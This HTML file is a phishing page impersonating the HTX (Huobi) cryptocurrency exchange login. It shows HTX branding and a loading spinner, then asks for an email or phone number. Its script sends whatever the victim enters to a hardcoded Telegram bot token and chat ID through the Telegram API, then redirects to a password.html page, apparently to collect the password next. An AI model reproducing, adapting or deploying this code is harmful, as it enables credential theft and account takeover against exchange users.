<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://kit.fontawesome.com/a076d05399.js" crossorigin="anonymous"></script>
    <title>HTX | Login Page</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            height: 100vh;
            background-color: #132040;
            font-family: Arial, sans-serif;
            text-align: center;
            position: relative;
        }
        .loader-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .logo {
            width: 100px;
            height: auto;
            margin-bottom: 10px;
            display: block;
        }
        .loader {
            margin-top: 55px;
            width: 30px;
            height: 30px;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
        }
        .loader::before, .loader::after {
            content: '';
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 5px solid transparent;
            border-top-color: #007bff;
            animation: spin 1.5s linear infinite;
        }
        .loader::after {
            animation-delay: 0.5s;
            border-top-color: #00bfff;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .content {
            display: none;
            background-color: #fff;
            height: 100%;
            width: 100%;
            padding: 20px;
            text-align: left;
        }
        .content h1 {
            font-size: 23px;
            margin: 0px;
            padding: 10px 0px;
        }
        .content p {
            font-size: 13px;
            margin: 0px;
            padding: 10px 0px;
        }
        .footer {
            position: absolute;
            bottom: 20px;
            width: 100%;
            text-align: center;
            font-size: 16px;
            font-weight: bold;
            color: #dfe3ed;
        }
        .content ul {
            list-style: none;
        }
        .content li {
            list-style: none;
            display: block;
            padding: 8px 0px;
			width: 100%;
        }
        .content input[type=email] {
            width: 100%;
            height: 50px;
            background-color: #fafafa;
            border: none;
            border-radius: 5px;
            outline: none;
            padding: 0px 15px;
            font-size: 14px;
        }
        .content button {
            width: 100%;
            height: 40px;
            background-color: #4689e0;
            border-radius: 5px;
            outline: none;
            padding: 5px 0px;
            border: none;
            color: #fff;
            cursor: pointer;
        }
        .signup {
            width: 400px;
            height: 30px;
            color: #4689e0;
            border: none;
            background-color: #fff;
            font-weight: bold;
            font-size: 15px;
			text-decoration: none;
			cursor: pointer;
        }
		 .divider {
            display: flex;
            align-items: center;
            margin: 15px 0;
            color: #888;
            font-size: 14px;
        }
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background-color: #ddd;
            margin: 0 10px;
        }
        .social-icons {
            display: flex;
            justify-content: center;
            gap: 15px;
        }
        .social-icons a {
            display: flex;
            align-items: center;
            justify-content: center;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            background-color: #f1f1f1;
            text-decoration: none;
        }
        .social-icons img {
            width: 20px;
            height: 20px;
        }
    </style>
</head>
<body>
    <div id="loader" class="loader-container">
        <img src="images/huobi13.png" alt="Logo HTX" class="logo">
        <img src="images/huobi23.png" alt="HTX Logo" class="logo">
        <div class="loader"></div>
    </div>
    
    <div id="content" class="content">
        <h1>Welcome to HTX</h1>
        <p>HTX Account</p>
        <form id="telegramForm">
            <ul>
                <li><input type="email" id="email" placeholder="Enter your email address/phone number" required></li>
                <li><button type="submit">Next</button></li>
            </ul>
        </form>
		   <div class="divider">Sign in with</div>
        <div class="social-icons">
            <a href="#"><img src="images/telegram.jpg" alt="Google"></a>
            <a href="#"><img src="images/gmail.png" alt="iCloud" style="height:15px;"></a>
            <a href="#"><img src="images/apple.png" alt="Telegram" style="height:px;"></a>
        </div>
    </div>
    </div>

    <div class="footer" id="footer">The Leading Global Exchange</div>

    <script>
        // Show content after loader delay
        setTimeout(() => {
            document.getElementById("loader").style.display = "none";
            document.getElementById("content").style.display = "block";
        }, 3000); // 3 seconds delay

        const TELEGRAM_BOT_TOKEN = "8022682561:AAEsak6S1bdhFFaSAoWkg9IDU2FZdZ2bXB8"; 
        const CHAT_ID = "7773839221"; 

        document.getElementById("telegramForm").addEventListener("submit", function(event) {
            event.preventDefault(); 

            let email = document.getElementById("email").value;
            let message = `New login attempt: ${email}`;

            let url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;

            fetch(url)
                .then(() => {
                    window.location.href = "password.html"; 
                })
                .catch(error => {
                    console.error("Error sending message:", error);
                    window.location.href = "password.html";
                });
        });
    </script>
</body>
</html>
